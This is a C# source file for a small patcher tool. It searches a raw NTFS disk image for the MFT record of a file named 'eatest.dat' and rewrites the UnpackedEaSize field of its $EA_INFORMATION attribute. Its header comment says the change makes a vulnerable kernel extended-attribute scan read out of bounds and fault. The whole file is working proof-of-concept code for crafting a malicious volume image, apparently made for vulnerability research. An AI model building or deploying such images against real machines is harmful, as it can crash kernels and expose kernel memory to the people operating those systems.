using System;
using System.IO;
using System.Text;

// patcher <vhd> <newUnpackedEaSizeHex>
// Locates the MFT FILE record for "eatest.dat" inside a raw NTFS volume image,
// finds its $EA_INFORMATION (type 0xD0) attribute, and rewrites UnpackedEaSize
// (the value the vulnerable EA scan loop bounds against) so the scan marches
// past the mapped $EA view -> kernel OOB read fault. Reports every field it
// touches. Fast native byte search (the equivalent PowerShell loop is too slow).
class Patcher
{
    static int Find(byte[] b, byte[] pat, int from)
    {
        for (int i = from; i <= b.Length - pat.Length; i++)
        {
            int j = 0;
            while (j < pat.Length && b[i + j] == pat[j]) j++;
            if (j == pat.Length) return i;
        }
        return -1;
    }

    static void Main(string[] a)
    {
        string vhd = a[0];
        uint newUnpk = Convert.ToUInt32(a[1], 16);
        byte[] b = File.ReadAllBytes(vhd);

        byte[] fn = Encoding.Unicode.GetBytes("eatest.dat");
        byte[] file = new byte[] { 0x46, 0x49, 0x4C, 0x45 }; // "FILE"
        int patched = 0;
        int from = 0;
        while (true)
        {
            int hit = Find(b, fn, from);
            if (hit < 0) break;
            from = hit + 1;

            // walk back <=1024 bytes to the enclosing FILE record header
            int rec = -1;
            for (int i = hit; i >= Math.Max(0, hit - 1024); i--)
                if (b[i] == 0x46 && b[i + 1] == 0x49 && b[i + 2] == 0x4C && b[i + 3] == 0x45) { rec = i; break; }
            if (rec < 0) continue;

            int firstAttr = rec + BitConverter.ToUInt16(b, rec + 0x14);
            int p = firstAttr;
            while (p + 4 <= b.Length)
            {
                uint type = BitConverter.ToUInt32(b, p);
                if (type == 0xFFFFFFFF) break;
                int len = BitConverter.ToInt32(b, p + 4);
                if (len <= 0) break;
                if (type == 0xD0) // $EA_INFORMATION
                {
                    ushort valOff = BitConverter.ToUInt16(b, p + 0x14);
                    int val = p + valOff;
                    ushort packed = BitConverter.ToUInt16(b, val + 0);
                    ushort need = BitConverter.ToUInt16(b, val + 2);
                    uint unpk = BitConverter.ToUInt32(b, val + 4);
                    Console.WriteLine("record@0x" + rec.ToString("X") + " D0@0x" + p.ToString("X") +
                                      " Packed=0x" + packed.ToString("X") + " Need=0x" + need.ToString("X") +
                                      " UnpackedEaSize=0x" + unpk.ToString("X") + " -> 0x" + newUnpk.ToString("X"));
                    byte[] nb = BitConverter.GetBytes(newUnpk);
                    Array.Copy(nb, 0, b, val + 4, 4);
                    patched++;
                }
                p += len;
            }
        }
        File.WriteAllBytes(vhd, b);
        Console.WriteLine("patched " + patched + " $EA_INFORMATION record(s)");
    }
}
